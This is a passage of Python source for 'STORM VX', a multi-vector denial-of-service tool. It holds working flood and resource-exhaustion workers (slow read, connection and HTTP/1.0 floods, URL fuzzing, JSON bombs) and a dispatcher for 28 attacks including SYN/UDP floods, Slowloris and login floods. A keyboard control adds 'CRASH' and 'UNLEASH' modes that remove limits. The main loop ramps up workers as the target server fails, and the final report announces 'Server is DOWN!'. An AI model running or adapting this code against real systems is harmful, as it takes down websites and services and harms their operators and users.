                    try:
                        chunk = await asyncio.wait_for(reader.read(1), timeout=5)
                        if not chunk: break
                        total_read += len(chunk)
                        await asyncio.sleep(random.uniform(1, 5))
                    except: break
                self.st.bw += total_read
                writer.close()
                try: await writer.wait_closed()
                except: pass
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.SLOW_READ, err="Timeout"))
            except Exception:
                self._rec(HR(False, None, time.time()-t, AttackMode.SLOW_READ, err="ConnErr"))

    async def _w_conn_flood(self, host, port, ssl_, d=0):
        """L7: CONNECTION Flood — open TCP connections and hold them."""
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                if ssl_:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=10)
                else:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=10)
                # Send minimal request start but don't finish
                writer.write(HF.conn_flood(host).encode())
                await writer.drain()
                self._rec(HR(True, None, time.time()-t, AttackMode.CONN_FLOOD, hint="CNF+"))
                # Hold the connection open
                for _ in range(random.randint(10, 40)):
                    if self._stop.is_set(): break
                    await asyncio.sleep(random.uniform(3, 10))
                    try:
                        extra = f"X-{rs(8)}: {rs(10)}\r\n"
                        writer.write(extra.encode()); await writer.drain()
                    except: break
                writer.close()
                try: await writer.wait_closed()
                except: pass
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.CONN_FLOOD, err="Timeout"))
            except Exception:
                self._rec(HR(False, None, time.time()-t, AttackMode.CONN_FLOOD, err="ConnErr"))

    async def _w_http10_flood(self, host, port, ssl_, pages, d=0):
        """L7: HTTP/1.0 Flood — no keep-alive, new connection each request."""
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            t = time.time()
            try:
                if ssl_:
                    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=10)
                else:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=10)
                path = random.choice(pages).split(host)[-1] if host in random.choice(pages) else "/"
                if len(path) > 50: path = path[:50]
                request = HF.http10_flood(host, path).encode()
                writer.write(request); await writer.drain(); self.st.bw_up += len(request)
                try:
                    response = await asyncio.wait_for(reader.read(65536), timeout=self.timeout)
                    self.st.bw += len(response)
                except: pass
                writer.close()
                try: await writer.wait_closed()
                except: pass
                self._rec(HR(True, None, time.time()-t, AttackMode.HTTP10_FLOOD, hint="H10+"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.HTTP10_FLOOD, err="Timeout"))
            except Exception:
                self._rec(HR(False, None, time.time()-t, AttackMode.HTTP10_FLOOD, err="ConnErr"))

    async def _w_url_fuzz(self, sess, root, d=0):
        """L7: URL Fuzzer — bombard random URLs to cause 404 processing."""
        if d > 0: await asyncio.sleep(d)
        while not self._stop.is_set():
            path = PayloadGen.random_url_path()
            url = root + path; t = time.time()
            try:
                async with sess.get(url, headers=HF.url_fuzz(), ssl=False, allow_redirects=False,
                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    b = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.URL_FUZZ, br=len(b), hint=f"UF{r.status}", url=url))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.URL_FUZZ, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.URL_FUZZ, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.URL_FUZZ, err="Err"))

    async def _w_json_bomb(self, sess, url, root, d=0):
        """L7: JSON Bomb — deeply nested JSON to kill parsers."""
        if d > 0: await asyncio.sleep(d)
        targets = [url, root + "/api/", root + "/api/v1/", root + "/graphql", root + "/api/json"]
        while not self._stop.is_set():
            target = random.choice(targets); t = time.time()
            try:
                payload = PayloadGen.json_bomb_payload().encode()
                async with sess.post(target, headers=HF.json_bomb(target, root), data=payload, ssl=False,
                                     allow_redirects=False, timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                    rb = await r.read()
                    self._rec(HR(r.status < 500, r.status, time.time()-t, AttackMode.JSON_BOMB, br=len(rb), bs=len(payload), hint=f"JB{r.status}"))
            except asyncio.TimeoutError:
                self._rec(HR(False, None, time.time()-t, AttackMode.JSON_BOMB, err="Timeout"))
            except aiohttp.ClientError:
                self._rec(HR(False, None, time.time()-t, AttackMode.JSON_BOMB, err="ConnErr"))
            except:
                self._rec(HR(False, None, time.time()-t, AttackMode.JSON_BOMB, err="Err"))

    # ─── Helpers ───

    @staticmethod
    def _al(st, body):
        b = body.lower()
        if st == 429: return "429 RL"
        if st == 503: return "503 Down"
        if any(x in b for x in ["captcha", "recaptcha"]): return "CAPTCHA"
        if any(x in b for x in ["locked", "too many"]): return "Locked"
        if any(x in b for x in ["welcome", "dashboard"]): return "LoginOK"
        if st in (301, 302, 303, 307): return "Redirect"
        return f"{st}"

    def _dist(self, n):
        active = list(self.dash.active_attacks)
        if not active:
            active = [AttackMode.FLOOD]
            self.dash.active_attacks = {AttackMode.FLOOD}
        n_active = len(active)
        per = n // n_active; remainder = n - per * n_active
        dist = {mode: per for mode in active}
        for i in range(remainder):
            dist[active[i % n_active]] = dist.get(active[i % n_active], 0) + 1
        return dist

    def _launch_worker(self, atype, sess, pages, resources, lurl, lf, af, host, port, ussl, api_eps, d=0):
        if atype == AttackMode.FLOOD: return asyncio.create_task(self._w_flood(sess, pages, d))
        elif atype == AttackMode.SLOWLORIS: return asyncio.create_task(self._w_slow(host, port, ussl, d))
        elif atype == AttackMode.SLOW_POST: return asyncio.create_task(self._w_spost(sess, lurl, d))
        elif atype == AttackMode.RANGE: return asyncio.create_task(self._w_range(sess, resources, d))
        elif atype == AttackMode.LOGIN: return asyncio.create_task(self._w_login(sess, lurl, lf, af, d))
        elif atype == AttackMode.RESOURCE: return asyncio.create_task(self._w_res(sess, resources, d))
        elif atype == AttackMode.POST_BOMB: return asyncio.create_task(self._w_pbomb(sess, lurl, d))
        elif atype == AttackMode.SSL_FLOOD: return asyncio.create_task(self._w_ssl_flood(host, port, d))
        elif atype == AttackMode.H2_RAPID: return asyncio.create_task(self._w_h2_rapid(host, port, pages, d))
        elif atype == AttackMode.WS_FLOOD: return asyncio.create_task(self._w_ws_flood(host, port, ussl, d))
        elif atype == AttackMode.WP_XMLRPC: return asyncio.create_task(self._w_wp_xmlrpc(sess, lurl, self.root, d))
        elif atype == AttackMode.CACHE_STORM: return asyncio.create_task(self._w_cache_storm(sess, pages, d))
        elif atype == AttackMode.API_FUZZ: return asyncio.create_task(self._w_api_fuzz(sess, lurl, self.root, api_eps, d))
        elif atype == AttackMode.MULTIPART: return asyncio.create_task(self._w_multipart(sess, lurl, self.root, d))
        elif atype == AttackMode.HEADER_BOMB: return asyncio.create_task(self._w_header_bomb(sess, pages, d))
        elif atype == AttackMode.CHUNKED: return asyncio.create_task(self._w_chunked(host, port, ussl, d))
        elif atype == AttackMode.SESSION_FLOOD: return asyncio.create_task(self._w_session_flood(sess, pages, d))
        elif atype == AttackMode.GQL_BOMB: return asyncio.create_task(self._w_gql_bomb(sess, lurl, self.root, d))
        elif atype == AttackMode.SYN_FLOOD: return asyncio.create_task(self._w_syn_flood(host, port, d))
        elif atype == AttackMode.UDP_FLOOD: return asyncio.create_task(self._w_udp_flood(host, port, d))
        elif atype == AttackMode.COOKIE_BOMB: return asyncio.create_task(self._w_cookie_bomb(sess, pages, d))
        elif atype == AttackMode.HEAD_FLOOD: return asyncio.create_task(self._w_head_flood(sess, pages, d))
        elif atype == AttackMode.XML_BOMB: return asyncio.create_task(self._w_xml_bomb(sess, lurl, self.root, d))
        elif atype == AttackMode.SLOW_READ: return asyncio.create_task(self._w_slow_read(host, port, ussl, pages, d))
        elif atype == AttackMode.CONN_FLOOD: return asyncio.create_task(self._w_conn_flood(host, port, ussl, d))
        elif atype == AttackMode.HTTP10_FLOOD: return asyncio.create_task(self._w_http10_flood(host, port, ussl, pages, d))
        elif atype == AttackMode.URL_FUZZ: return asyncio.create_task(self._w_url_fuzz(sess, self.root, d))
        elif atype == AttackMode.JSON_BOMB: return asyncio.create_task(self._w_json_bomb(sess, lurl, self.root, d))
        return None

    def _add_workers(self, n, sess, pages, resources, lurl, lf, af, host, port, ussl, api_eps):
        dist = self._dist(n)
        for atype, cnt in dist.items():
            for _ in range(cnt):
                d = random.uniform(0, 0.5)
                task = self._launch_worker(atype, sess, pages, resources, lurl, lf, af, host, port, ussl, api_eps, d)
                if task: self._tasks.append(task)
        self.st.users += n

    # ─── Keyboard ───

    async def _kbd(self):
        # Set terminal to raw mode on Linux for instant key reads
        old_settings = None
        _has_termios = HAS_TERMIOS or HAS_TERMIOS_LOCAL
        if _has_termios:
            try:
                import tty as _tty, termios as _termios
                old_settings = _termios.tcgetattr(sys.stdin.fileno())
                _tty.setraw(sys.stdin.fileno())
            except:
                old_settings = None
        try:
            while not self._stop.is_set():
                try:
                    ch = None
                    if HAS_MSVCRT:
                        import msvcrt
                        if msvcrt.kbhit(): ch = msvcrt.getch()
                    elif _has_termios:
                        dr, _, _ = select.select([sys.stdin], [], [], 0)
                        if dr:
                            ch = sys.stdin.buffer.read(1)
                            # In raw mode, Ctrl+C sends b'\x03' instead of raising KeyboardInterrupt
                            if ch == b'\x03':
                                self._log("Ctrl+C — Stopping...", "error", "CTRL")
                                self._stop.set(); break
                    else:
                        await asyncio.sleep(2); continue

                    if ch is not None:
                        if ch in (b'+', b'='):
                            self._add_workers(1000, self._sess, self._pages, self._resources,
                                              self._lurl, self._lf, self._af, self._host,
                                              self._port, self._ussl, self._api_endpoints)
                            self._log(f"+1000 WORKERS -> {self.st.users:,} total", "success", "CTRL")
                        elif ch in (b'-', b'_'):
                            self.step = max(self.step - 200, 100)
                            self._log(f"Step reduced to {self.step}", "warning", "CTRL")
                        elif ch == b'q':
                            self._log("Stopping attack...", "error", "CTRL")
                            self._stop.set()
                        elif ch == b'p':
                            activated = self.dash.activate_more_attacks(5)
                            if activated:
                                self._log(f"+5 Attacks: {', '.join(activated)}", "success", "CTRL")
                            else:
                                self._log("All 28 attacks already active!", "warning", "CTRL")
                        elif ch == b'a':
                            self.dash.active_attacks = set(AttackMode) - {AttackMode.CRASH}
                            self._log("ALL 28 ATTACKS ENABLED!", "success", "CTRL")
                        elif ch == b'c':
                            self.dash.crash_mode = not self.dash.crash_mode
                            mode = "CRASH (unlimited ramp)" if self.dash.crash_mode else "NORMAL (fixed ramp)"
                            self._log(f"Mode: {mode}", "bright", "CTRL")
                        elif ch == b'n':
                            self.resman.set_unleash(False)
                            self.resman.mode = ResourceManager.NORMAL
                            self._log(f"NORMAL MODE — CPU cap:75% RAM cap:60%", "warning", "CTRL")
                        elif ch == b'x':
                            was_unleash = self.resman.is_unleash
                            self.resman.set_unleash(not was_unleash)
                            if self.resman.is_unleash:
                                self.dash.crash_mode = True
                                self.dash.active_attacks = set(AttackMode) - {AttackMode.CRASH}
                                self.step = 5000
                                self._log(f"{C.BD}{C.R}UNLEASH MODE! ALL LIMITS REMOVED! 1000% POWER!{C.RS}", "bright", "CTRL")
                                self._log(f"CPU/RAM limits: OFF | Worker cap: UNLIMITED | All 28 attacks: ON", "bright", "CTRL")
                            else:
                                self.step = 500
                                self._log(f"{C.G}SAFE MODE restored — CPU:{self.resman.cpu_limit_safe}% RAM:{self.resman.ram_limit_safe}%{C.RS}", "info", "CTRL")
                except:
                    pass
                await asyncio.sleep(0.05)
        finally:
            # Restore terminal settings
            if old_settings is not None:
                try:
                    import termios as _termios
                    _termios.tcsetattr(sys.stdin.fileno(), _termios.TCSADRAIN, old_settings)
                except:
                    pass

    async def _render_loop(self):
        while not self._stop.is_set():
            try: self.dash.render(self.st, self)
            except: pass
            await asyncio.sleep(0.5)

    # ─── Main Run ───

    async def run(self):
        self.st = S(); self.st.t0 = time.time()
        cpu_count = multiprocessing.cpu_count()

        # Initialize resource manager and show system info
        self.resman.update()
        self._log(f"System: {cpu_count} CPUs | {self.resman.ram_total_gb:.0f}GB RAM", "info", "SYS")
        self._log(f"Resource mode: {self.resman.mode_name} — CPU cap:{self.resman.cpu_limit}% RAM cap:{self.resman.ram_limit}%", "info", "SYS")
        self._log(f"Worker cap: {self.resman.worker_cap:,} | Press [x] to UNLEASH (1000%)", "info", "SYS")

        connector = aiohttp.TCPConnector(limit=0, force_close=False, enable_cleanup_closed=True, ttl_dns_cache=600, keepalive_timeout=120)
        self.dash.enter()

        try:
            async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=self.timeout)) as sess:
                self.disc._add_log = self._log
                ok = await self.disc.run(sess)
                if not ok: self.dash.leave(); return

                pages = self.disc.get_pages()
                resources = self.disc.get_res()
                lurl = self.url; lf = self.disc.login_fields; af = self.disc.asp_fields
                api_eps = self.disc.api_endpoints or [self.root + "/api/"]

                from urllib.parse import urlparse
                parsed = urlparse(self.url)
                host = parsed.hostname; port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                ussl = parsed.scheme == 'https'

                self._sess = sess; self._pages = pages; self._resources = resources
                self._lurl = lurl; self._lf = lf; self._af = af
                self._host = host; self._port = port; self._ussl = ussl; self._api_endpoints = api_eps

                self._log(f"{C.BD}{C.G}STORM VX — 28-Vector Engine{C.RS}", "bright", "SYS")
                self._log(f"Target: {self.url}", "info", "SYS")
                self._log(f"ALL 28 vectors ACTIVE from start!", "bright", "SYS")
                self._log(f"Ramp: +{self.step} workers every {self.step_dur}s", "info", "SYS")
                self._log(f"Pages: {len(pages)} | Resources: {len(resources)} | APIs: {len(api_eps)}", "info", "SYS")
                self._log("[+] +1000W  [-] -Step  [p] +5Atks  [a] AllON  [c] CRASH  [n] Normal  [x] UNLEASH  [q] Stop", "info", "SYS")

                kbd_task = asyncio.create_task(self._kbd()); self._tasks.append(kbd_task)
                render_task = asyncio.create_task(self._render_loop()); self._tasks.append(render_task)

                # Initial burst — calculated from system resources
                initial = min(1000, self.resman.worker_cap)
                dist = self._dist(initial)
                for atype, cnt in dist.items():
                    for _ in range(cnt):
                        d = random.uniform(0, 0.2)
                        task = self._launch_worker(atype, sess, pages, resources, lurl, lf, af, host, port, ussl, api_eps, d)
                        if task: self._tasks.append(task)
                self.st.users = initial
                self._log(f"Initial burst: {initial} workers across {len(self.dash.active_attacks)} vectors!", "bright", "SYS")

                while not self._stop.is_set():
                    self.st.phase += 1
                    new = self.step

                    # ─── Resource Manager throttle (CPU/RAM protection) ───
                    res_throttle, res_mult = self.resman.should_throttle()
                    if res_throttle:
                        new = int(new * res_mult)
                        self._log(f"RES-THROTTLE: CPU {self.resman.cpu_pct:.0f}% RAM {self.resman.ram_pct:.0f}% -> +{new}", "warning", "SYS")
                    elif res_mult < 1.0:
                        new = int(new * res_mult)

                    # ─── Worker cap enforcement ───
                    if self.st.users >= self.resman.worker_cap:
                        self._log(f"WORKER CAP: {self.resman.worker_cap:,} reached (mode: {self.resman.mode_name})", "warning", "SYS")
                        await asyncio.sleep(self.step_dur)
                        self._snap()
                        continue

                    # ─── Server-side auto-throttle ───
                    should_throttle, step_mult = self.throttle.check(self.st.users, self.st.rsr)
                    if should_throttle:
                        new = int(new * step_mult)
                        self._log(f"SRV-THROTTLE: ramp -> +{new}", "warning", "SYS")

                    if self.dash.crash_mode and self.st.total > 50:
                        rsr = self.st.rsr
                        if rsr < 20: new = int(new * 0.3); self._log(f"Server NEAR DEATH ({rsr:.0f}%) — Back off!", "error", "SYS")
                        elif rsr < 30: new = self.step * 3; self._log(f"Server COLLAPSING ({rsr:.0f}%) — x3!", "error", "SYS")
                        elif rsr < 50: new = self.step * 2; self._log(f"Server OVERLOADED ({rsr:.0f}%) — x2!", "error", "SYS")
                        elif rsr < 70: new = int(self.step * 1.5); self._log(f"Heavy pressure ({rsr:.0f}%) — +50%", "warning", "SYS")

                    new = max(new, 30)
                    self._log(f"[Phase {self.st.phase}] -> +{new} workers (total: {self.st.users + new:,})", "bright", "SYS")

                    dist = self._dist(new)
                    for atype, cnt in dist.items():
                        for _ in range(cnt):
                            d = random.uniform(0, self.step_dur * 0.15)
                            task = self._launch_worker(atype, sess, pages, resources, lurl, lf, af, host, port, ussl, api_eps, d)
                            if task: self._tasks.append(task)
                    self.st.users += new
                    await asyncio.sleep(self.step_dur)
                    self._snap()

                self._stop.set()
                for t in self._tasks: t.cancel()
                await asyncio.sleep(0.5)

        except Exception as e:
            self._log(f"Engine error: {e}", "error", "SYS")
        finally:
            self.st.t1 = time.time()
            self.dash.leave()

    def _snap(self):
        self._snaps.append({
            "t": self.st.dur, "u": self.st.users, "tot": self.st.total,
            "ok": self.st.ok_, "f": self.st.fail, "rps": self.st.rrps,
            "art": self.st.rart, "sr": self.st.rsr,
            "rl": self.st.rl, "cap": self.st.cap, "bw": self.st.kbps,
            "bw_up": self.st.kbps_up, "total_bw": self.st.total_bandwidth,
            "phase": self.st.phase, "step": self.step,
        })


# ═══════════════════════════════════════════════════════════════════════════════
# Report
# ═══════════════════════════════════════════════════════════════════════════════

def report(st, url, snaps, engine, stopped_by_user=False):
    print(f"\n{'='*78}")
    if stopped_by_user:
        print(f"  {C.BD}{C.Y}Test stopped by user (q / Ctrl+C){C.RS}")
    print(f"  {C.BD}{C.G}STORM VX — Final Report{C.RS}")
    print(f"{'='*78}")
    print(f"  Target: {C.W}{url}{C.RS}")
    if engine.disc.server_tech:
        print(f"  Server: {C.BD}{', '.join(engine.disc.server_tech)}{C.RS}")
    print(f"  Attack Vectors: {C.BD}28{C.RS} ({len(engine.dash.active_attacks)} active)")
    print(f"  {'-'*70}")

    print(f"\n  +-- {C.BD}Summary{C.RS} {'-'*52}")
    print(f"  |")
    print(f"  |  Duration:        {C.BD}{st.dur:.1f}s{C.RS} ({st.dur/60:.1f} min)")
    print(f"  |  Total Requests:  {C.BD}{st.total:,}{C.RS}")
    print(f"  |  Successful:      {C.G}{st.ok_:,}{C.RS} ({st.sr:.1f}%)")
    print(f"  |  Failed:          {C.R}{st.fail:,}{C.RS}")
    print(f"  |  Avg RPS:         {C.BD}{st.rps:.1f}{C.RS}")
    if snaps:
        print(f"  |  Peak RPS:        {C.BD}{max(s['rps'] for s in snaps):.1f}{C.RS}")
    print(f"  |  Max Workers:     {C.BD}{st.users:,}{C.RS}")
    print(f"  |  Max Phase:       {C.BD}{st.phase}{C.RS}")
    if st.tmo > 0: print(f"  |  Timeouts:        {C.Y}{st.tmo:,}{C.RS}")
    if st.conn > 0: print(f"  |  Conn Errors:     {C.R}{st.conn:,}{C.RS}")
    if st.cache_b > 0: print(f"  |  Cache Busted:    {C.CY}{st.cache_b:,}{C.RS}")
    print(f"  |")
    print(f"  +--{'-'*55}")

    # Bandwidth
    print(f"\n  +-- {C.BD}{C.CY}Bandwidth{C.RS} {'-'*40}")
    print(f"  |")
    print(f"  |  Downloaded: {C.G}{fmt_bytes(st.bw)}{C.RS}  Uploaded: {C.M}{fmt_bytes(st.bw_up)}{C.RS}  Total: {C.W}{fmt_bytes(st.total_bandwidth)}{C.RS}")
    print(f"  |")
    print(f"  +--{'-'*55}")

    # Attack Distribution (28)
    all_attacks = [m for m in AttackMode if m != AttackMode.CRASH]
    items = [(mode, st.attack_counts.get(mode, 0)) for mode in all_attacks]
    tot = sum(c for _, c in items)
    if tot > 0:
        print(f"\n  +-- {C.BD}Attack Distribution (28 Vectors){C.RS} {'-'*24}")
        print(f"  |")
        for mode, c in items:
            if c > 0:
                name = ATTACK_NAMES[mode]; color = ATTACK_COLORS.get(mode, C.W)
                bar_len = int(c / tot * 30)
                print(f"  |  {color}{name:14s}{C.RS} {C.BD}{c:>7,}{C.RS} ({c/tot*100:4.0f}%) {'#' * bar_len}")
        print(f"  |")
        print(f"  +--{'-'*55}")

    # Response Times
    if st.rts:
        print(f"\n  +-- {C.BD}Response Times{C.RS} {'-'*42}")
        print(f"  |  Min: {C.G}{min(st.rts):.3f}s{C.RS}  Max: {C.R}{max(st.rts):.3f}s{C.RS}  Avg: {C.BD}{st.art:.3f}s{C.RS}  P95: {C.Y}{st.p95:.3f}s{C.RS}")
        print(f"  +--{'-'*55}")

    # Security
    print(f"\n  +-- {C.BD}{C.R}Security{C.RS} {'-'*44}")
    print(f"  |  RateLimit: {'ACTIVE' if st.rl > 0 else 'NONE!'}  CAPTCHA: {'ACTIVE' if st.cap > 0 else 'None'}  Lockout: {'ACTIVE' if st.lock > 0 else 'NONE!'}  5xx: {st.serr:,}")
    print(f"  +--{'-'*55}")

    # Analysis
    print(f"\n  +-- {C.BD}Final Analysis{C.RS} {'-'*40}")
    if st.sr >= 95: print(f"  |  [GREEN]  Server resilient")
    elif st.sr >= 80: print(f"  |  [YELLOW] Server under pressure")
    elif st.sr >= 50: print(f"  |  [ORANGE] Server overloaded")
    else: print(f"  |  [RED]    Server is DOWN!")
    print(f"  +--{'-'*55}")
    print(f"\n{'='*78}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    url = None; step = 500; step_dur = 5; timeout = 10

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        a = args[i]
        if a in ('--step', '-s') and i+1 < len(args): step = int(args[i+1]); i += 2
        elif a in ('--duration', '-d') and i+1 < len(args): step_dur = int(args[i+1]); i += 2
        elif a in ('--timeout', '-t') and i+1 < len(args): timeout = int(args[i+1]); i += 2
        elif a in ('--help', '-h'):
            print(f"""
{STORM_ASCII.format(G=C.G, RS=C.RS, BD=C.BD)}

STORM VX — 28-Vector Terminal Dashboard Engine

  Usage:
    python storm_vx.py https://example.com
    python storm_vx.py https://example.com --step 500 --duration 3

  Parameters:
    --step, -s N      Workers per phase (default: 500)
    --duration, -d N  Phase duration in seconds (default: 5)
    --timeout, -t N   Request timeout (default: 10)

  Controls:
    +      Add 1000 workers instantly
    -      Reduce step size
    p      Activate 5 more attacks
    a      Enable ALL 28 attack vectors
    c      Toggle CRASH mode
    x      UNLEASH! Remove ALL limits (1000% power)
    n      Switch to NORMAL mode (CPU 75%, RAM 60%)
    q      Stop attack

  28 Attack Vectors:
    Batch 1 — Original (8):
      1=HTTP Flood  2=Slowloris  3=Slow POST  4=Range Exploit
      5=Login Flood 6=Resource Bomb 7=POST Bomb 8=SSL Flood(L6)
    Batch 2 — L7 Heavy (10):
      9=H2 Rapid Reset 10=WebSocket 11=WP XMLRPC 12=Cache Storm
      13=API Fuzz 14=Multipart 15=Header Bomb 16=Chunked Transfer
      17=Session Flood 18=GraphQL Bomb
    Batch 3 — L4+L7 New (10):
      19=SYN Flood(L4) 20=UDP Flood(L4) 21=Cookie Bomb 22=HEAD Flood
      23=XML Bomb 24=Slow Read 25=CONN Flood 26=HTTP/1.0 Flood
      27=URL Fuzzer 28=JSON Bomb
""")
            sys.exit(0)
        elif not a.startswith('-'): url = a; i += 1
        else: i += 1

    if not url:
        print(STORM_ASCII.format(G=C.G, RS=C.RS, BD=C.BD)); print()
        while True:
            try: raw = input(f"  {C.CY}Target URL:{C.RS} ").strip()
            except (EOFError, KeyboardInterrupt): print(f"\n  {C.Y}Bye!{C.RS}\n"); sys.exit(0)
            if not raw: print(f"  {C.R}Please enter a URL!{C.RS}"); continue
            if not raw.startswith('http://') and not raw.startswith('https://'):
                raw = 'https://' + raw; print(f"  {C.DM}-> Fixed: {raw}{C.RS}")
            url = raw; break

    print(f"\n{'='*60}")
    print(STORM_ASCII.format(G=C.G, RS=C.RS, BD=C.BD))
    print(f"{'='*60}")
    print(f"  Target: {C.W}{url}{C.RS}")
    print(f"  Vectors: {C.BD}28{C.RS} attack types ({len(DEFAULT_ATTACKS)} active by default)")
    print(f"  Ramp: +{C.B}{step}{C.RS} workers every {C.B}{step_dur}{C.RS}s")
    print(f"  Timeout: {C.B}{timeout}s{C.RS}")
    print(f"  {C.G}+{C.RS} +1000W | {C.Y}-{C.RS} -Step | {C.CY}p{C.RS} +5Atks | {C.BD}a{C.RS} AllON | {C.BD}c{C.RS} CRASH | {C.Y}n{C.RS} Normal | {C.R}x{C.RS} UNLEASH | {C.R}q{C.RS} Stop")
    print(f"\n  {C.Y}Initializing...{C.RS}")

    engine = Storm(url, step=step, step_dur=step_dur, timeout=timeout)
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)

    if sys.platform != 'win32':
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, engine.stop)

    stopped_by_user = False
    try:
        loop.run_until_complete(engine.run())
    except KeyboardInterrupt:
        stopped_by_user = True; engine.stop()
        print(f"\n  {C.Y}Ctrl+C — Stopping...{C.RS}")
        try: loop.run_until_complete(asyncio.sleep(1))
        except: pass
    except Exception as e:
        print(f"\n  {C.R}Error: {e}{C.RS}")
    finally:
        if engine.dash._screen_active: engine.dash.leave()
        if engine.st.t1 == 0: engine.st.t1 = time.time()
        engine._snap()
        try: loop.run_until_complete(asyncio.sleep(0.2))
        except: pass
        loop.close()
        if engine.st.total > 0:
            print(f"\n  {C.CY}Generating report...{C.RS}")
            time.sleep(0.3)
            report(engine.st, url, engine._snaps, engine, stopped_by_user=stopped_by_user)


if __name__ == '__main__':
    main()
